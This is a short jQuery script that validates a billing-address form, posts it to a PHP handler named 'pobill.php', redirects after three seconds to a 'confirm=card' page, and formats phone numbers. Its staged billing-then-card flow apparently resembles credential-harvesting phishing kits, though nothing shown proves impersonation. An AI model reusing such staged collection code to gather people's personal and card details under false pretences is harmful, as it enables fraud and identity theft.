$("#billing").validate({
     rules: {

        Fname: {required: true,},
        Lname: {required: true,},
        Address: {required: true,},
        City: {required: true,},
        State: {required: true,},
        Zip: {required: true,
               min: 0
                
               },
        
        

    },
  submitHandler: function(form) {
    $.post("../post/pobill.php", $("#billing").serialize(), function(GET) {
      setTimeout(function() {
        window.location.assign("confirm=card");
      }, 3000)
    });
  },
});

// Used to format phone number
function phoneFormatter() {
  $('.phone').on('input', function() {
    var number = $(this).val().replace(/[^\d]/g, '')
    if (number.length == 7) {
      number = number.replace(/(\d{3})(\d{4})/, "$1-$2");
    } else if (number.length == 10) {
      number = number.replace(/(\d{3})(\d{3})(\d{4})/, "($1) $2-$3");
    }
    $(this).val(number)
  });
};

$(phoneFormatter);
